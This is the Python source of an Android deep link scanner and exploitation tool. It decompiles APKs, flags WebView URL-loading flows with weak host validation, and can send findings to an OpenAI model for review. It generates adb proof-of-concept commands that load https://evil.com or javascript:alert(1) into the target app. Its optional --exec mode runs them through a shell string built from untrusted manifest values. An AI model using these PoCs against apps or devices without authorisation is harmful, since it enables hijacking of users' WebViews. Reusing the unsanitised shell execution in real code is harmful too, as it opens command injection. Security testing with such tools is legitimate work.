import xml.etree.ElementTree as ET
import subprocess
import argparse
import os
import shutil
import sys
import json
import re

ANDROID_NS = "{http://schemas.android.com/apk/res/android}"

OUT_DIR = os.path.abspath("deepc_out")
APKTOOL_DIR = os.path.join(OUT_DIR, "apktool")

JADX_OUT_DIR = os.path.abspath("deepc_jadx_out")
SRC_DIR = os.path.join(JADX_OUT_DIR, "sources")

# ---------------- Validation Patterns ---------------- #

STRONG_HOST_PATTERNS = [
    r'getHost\(\)\.equals\("',
    r'equalsIgnoreCase\("',
]

WEAK_HOST_PATTERNS = [
    r'endsWith\("',
    r'contains\("',
    r'startsWith\("https://',
    r'startsWith\("http://',
]

# ---------------- Banner ---------------- #

def banner():
    print(r"""
██████╗ ███████╗███████╗██████╗       ██████╗
██╔══██╗██╔════╝██╔════╝██╔══██╗     ██╔════╝
██║  ██║█████╗  █████╗  ██████╔╝     ██║     
██║  ██║██╔══╝  ██╔══╝  ██╔═══╝      ██║     
██████╔╝███████╗███████╗██║          ╚██████╗
╚═════╝ ╚══════╝╚══════╝╚═╝           ╚═════╝

 Deep-C | Android Deep Link Exploitation Framework By Kishor Balan
 Decompile • Detect • Validate • Exploit
 
 Usage: python3 deepc.py -a <path/to/app.apk> 
 AI verdict : python3 deepc.py -a <path/to/app.apk> --ai-review
""")

# ---------------- AI Review ---------------- #

def ai_review_finding(finding):
    try:
        from openai import OpenAI
        client = OpenAI()

        prompt = f"""
Mobile security expert: Analyze this deeplink finding and provide ONLY a 1-2 sentence verdict on exploitability.

Activity: {finding.get('activity')}
Level: {finding.get('level')}
Path: {finding.get('path')}
Query Parameter: {finding.get('query_param')}
Weak Validation: {finding.get('weak_validation')}
Strong Validation: {finding.get('strong_validation')}

Response format: "EXPLOITABLE/NOT EXPLOITABLE: Brief reason."
"""

        response = client.chat.completions.create(
            model="gpt-4o-mini",
            messages=[{"role": "user", "content": prompt}],
            temperature=0.2
        )

        return response.choices[0].message.content.strip()

    except Exception as e:
        return f"[AI Review Failed] {str(e)}"

# ---------------- Helpers ---------------- #

def run(cmd, msg):
    print(f"[*] {msg}")
    subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def clean_dirs():
    if os.path.exists(OUT_DIR):
        shutil.rmtree(OUT_DIR)
    os.makedirs(OUT_DIR, exist_ok=True)

# ---------------- Decompilation ---------------- #

def decompile_manifest(apk):
    run(["apktool", "d", apk, "-o", APKTOOL_DIR, "-f"],
        "Decompiling APK (manifest & resources)")
    manifest = os.path.join(APKTOOL_DIR, "AndroidManifest.xml")
    if not os.path.exists(manifest):
        sys.exit("[-] AndroidManifest.xml not found")
    return manifest

def decompile_source_with_jadx(apk):
    if os.path.exists(JADX_OUT_DIR):
        shutil.rmtree(JADX_OUT_DIR)

    os.makedirs(JADX_OUT_DIR, exist_ok=True)

    print("[*] Decompiling APK to Java/Kotlin source (jadx)")
    subprocess.run(["jadx", "-d", JADX_OUT_DIR, apk])

def verify_jadx_output():
    if not os.path.isdir(SRC_DIR):
        sys.exit("[-] Jadx output directory not found")

    for root, _, files in os.walk(SRC_DIR):
        for f in files:
            if f.endswith((".java", ".kt")):
                return

    sys.exit("[-] Jadx ran but produced no Java/Kotlin files")

# ---------------- Manifest Parsing ---------------- #

def parse_manifest(path):
    root = ET.parse(path).getroot()
    return root, root.attrib.get("package")

def is_exported(component):
    exported = component.attrib.get(ANDROID_NS + "exported")
    if exported is None:
        return component.find("intent-filter") is not None
    return exported.lower() == "true"

def extract_deeplinks(activity):
    deeplinks = []
    for intent in activity.findall("intent-filter"):
        actions = [a.attrib.get(ANDROID_NS + "name") for a in intent.findall("action")]
        cats = [c.attrib.get(ANDROID_NS + "name") for c in intent.findall("category")]

        if "android.intent.action.VIEW" not in actions:
            continue
        if "android.intent.category.BROWSABLE" not in cats:
            continue

        for data in intent.findall("data"):
            deeplinks.append({
                "scheme": data.attrib.get(ANDROID_NS + "scheme"),
                "host": data.attrib.get(ANDROID_NS + "host"),
                "path": (
                    data.attrib.get(ANDROID_NS + "path")
                    or data.attrib.get(ANDROID_NS + "pathPrefix")
                    or data.attrib.get(ANDROID_NS + "pathPattern")
                )
            })
    return deeplinks

# ---------------- Source Code Analysis ---------------- #

def find_activity_source(activity):
    base = activity.split(".")[-1]
    print(f"[*] Analyzing source for activity: {activity}")

    for root, _, files in os.walk(SRC_DIR):
        for ext in (".java", ".kt"):
            name = base + ext
            if name in files:
                path = os.path.join(root, name)
                print(f"    [+] Found source file: {path}")
                return path

    print(f"    [!] Source file not found for {activity}")
    return None

def extract_paths_from_code(code):
    """Enhanced path extraction with comprehensive regex patterns"""
    paths = set()
    
    # Enhanced regex patterns for path detection
    patterns = [
        # Direct path comparisons
        r'getPath\(\)\.equals\("([^"]+)"\)',
        r'uri\.getPath\(\)\s*==\s*"([^"]+)"',
        r'uri\.getPath\(\)\.equals\("([^"]+)"\)',
        
        # Kotlin equivalents
        r'StringsKt\.equals\$default\(\s*uri\.getPath\(\)\s*,\s*"([^"]+)"',
        r'uri\.path\s*==\s*"([^"]+)"',
        
        # Path checks and validations
        r'path\.equals\("([^"]+)"\)',
        r'pathSegments\.get\(\d+\)\.equals\("([^"]+)"\)',
        r'getPathSegments\(\)\.get\(\d+\)\.equals\("([^"]+)"\)',
        
        # startsWith/endsWith for paths
        r'getPath\(\)\.startsWith\("([^"]+)"\)',
        r'getPath\(\)\.endsWith\("([^"]+)"\)',
        r'uri\.getPath\(\)\.startsWith\("([^"]+)"\)',
        
        # contains checks
        r'getPath\(\)\.contains\("([^"]+)"\)',
        r'uri\.getPath\(\)\.contains\("([^"]+)"\)',
        
        # Switch/case statements
        r'case\s+"([^"]+)"\s*:',
        
        # String literals that look like paths in routing logic
        r'"(/[^"]*)"',
        
        # Pattern matching
        r'Pattern\.compile\("([^"]+)"\)',
        r'matches\("([^"]+)"\)'
    ]

    for pattern in patterns:
        matches = re.findall(pattern, code, re.IGNORECASE)
        for match in matches:
            # Filter for actual paths (start with / or contain path-like patterns)
            if (match.startswith("/") or 
                re.match(r'^[a-zA-Z0-9_/-]+$', match) and "/" in match):
                paths.add(match)

    return list(paths)

def extract_query_params(code):
    """Enhanced query parameter extraction"""
    params = set()
    
    patterns = [
        # Standard getQueryParameter calls
        r'getQueryParameter\(\s*"([^"]+)"\s*\)',
        r'uri\.getQueryParameter\(\s*"([^"]+)"\s*\)',
        
        # Kotlin variants
        r'queryParameter\(\s*"([^"]+)"\s*\)',
        
        # Query parameter keys in variables
        r'String\s+\w+\s*=\s*"([^"]+)"\s*;.*getQueryParameter\(\s*\w+\s*\)',
        
        # Bundle/Intent extras that might be from query params
        r'getStringExtra\(\s*"([^"]+)"\s*\)',
        r'getString\(\s*"([^"]+)"\s*\)'
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, code, re.IGNORECASE)
        params.update(matches)
    
    return list(params)

def analyze_source(path):
    if not path or not os.path.exists(path):
        return None

    with open(path, "r", errors="ignore") as f:
        code = f.read()

    # Extract paths and query parameters from source code
    code_paths = extract_paths_from_code(code)
    query_params = extract_query_params(code)

    direct_flow = "loadUrl(" in code and "getQueryParameter(" in code
    override_flow = (
        re.search(r'\w+\s*=\s*.*getQueryParameter\(', code) and
        re.search(r'loadUrl\(\s*\w+\s*\)', code)
    )

    if not (direct_flow or override_flow):
        return None

    strong_validation = any(re.search(p, code) for p in STRONG_HOST_PATTERNS)
    weak_validation = any(re.search(p, code) for p in WEAK_HOST_PATTERNS)

    if not strong_validation and not weak_validation:
        level = "VULNERABLE"
    elif weak_validation and not strong_validation:
        level = "WEAK_VALIDATION"
    else:
        level = "SAFE"

    return {
        "level": level,
        "query_params": query_params,
        "code_paths": code_paths,  # Include extracted paths
        "weak_validation": weak_validation,
        "strong_validation": strong_validation
    }

# ---------------- PoC Generation ---------------- #

def generate_pocs(pkg, activity, deeplink, param_name):
    scheme = deeplink.get("scheme") or "https"
    host = deeplink.get("host") or ""
    path = deeplink.get("path") or "/"
    base = f"{scheme}://{host}" if host else f"{scheme}://"

    if not param_name:
        param_name = "url"

    return [
        f'adb shell am start -a android.intent.action.VIEW -d "{base}{path}?{param_name}=https://evil.com"',
        f'adb shell am start -a android.intent.action.VIEW -d "{base}{path}?{param_name}=javascript:alert(1)"',
        f'adb shell am start -n {pkg}/{activity}'
    ]

# ---------------- Main ---------------- #

def main():
    banner()

    parser = argparse.ArgumentParser()
    parser.add_argument("-a", "--apk", required=True)
    parser.add_argument("--exec", action="store_true")
    parser.add_argument("--ai-review", action="store_true",
                        help="Enable AI validation of findings")
    args = parser.parse_args()

    apk_path = os.path.abspath(args.apk)
    if not os.path.isfile(apk_path):
        sys.exit(f"[-] APK not found: {apk_path}")

    clean_dirs()
    manifest = decompile_manifest(apk_path)
    decompile_source_with_jadx(apk_path)
    verify_jadx_output()

    root, package = parse_manifest(manifest)
    print(f"[+] Package: {package}\n")

    results = {"package": package, "findings": []}

    for app in root.findall("application"):
        for act in app.findall("activity"):
            name = act.attrib.get(ANDROID_NS + "name")
            if not name or not is_exported(act):
                continue

            deeplinks = extract_deeplinks(act)
            if not deeplinks:
                continue

            src = find_activity_source(name)
            analysis = analyze_source(src)
            if not analysis or analysis["level"] == "SAFE":
                continue

            print("[+] Deep Link Issue Found")
            print(f"    Activity : {name}")
            print(f"    Level    : {analysis['level']}")

            # Use both extracted query params and code paths
            param_candidates = analysis.get("query_params") or ["url"]
            code_paths = analysis.get("code_paths", [])
            
            # Display extracted paths from source code
            if code_paths:
                print(f"    Code Paths Found: {', '.join(code_paths)}")

            for dl in deeplinks:
                # Use extracted paths if available, otherwise use manifest path
                paths_to_test = code_paths if code_paths else [dl.get("path")]
                
                for test_path in paths_to_test:
                    for param in param_candidates:
                        print(f"    Entry Path : {test_path or dl.get('path')}")
                        print(f"    Using Query Parameter: {param}")
                        print("    PoCs:")

                        # Create a modified deeplink for PoC generation
                        test_deeplink = dl.copy()
                        if test_path:
                            test_deeplink["path"] = test_path

                        pocs = generate_pocs(package, name, test_deeplink, param)

                        for p in pocs:
                            print(f"      {p}")
                            if args.exec:
                                subprocess.run(p, shell=True)

                        finding = {
                            "activity": name,
                            "source": src,
                            "path": test_path or dl.get("path"),
                            "manifest_path": dl.get("path"),
                            "code_paths": code_paths,
                            "query_param": param,
                            "level": analysis["level"],
                            "weak_validation": analysis["weak_validation"],
                            "strong_validation": analysis["strong_validation"],
                            "pocs": pocs
                        }

                        if args.ai_review:
                            print("    [*] Running AI review...")
                            ai_output = ai_review_finding(finding)
                            print("    [AI Verdict]")
                            print("    " + ai_output.replace("\n", "\n    "))
                            finding["ai_review"] = ai_output

                        results["findings"].append(finding)

            print("-" * 70)

    with open("deepc_result.json", "w") as f:
        json.dump(results, f, indent=4)

    print("\n[+] Results saved to deepc_result.json")

if __name__ == "__main__":
    main()
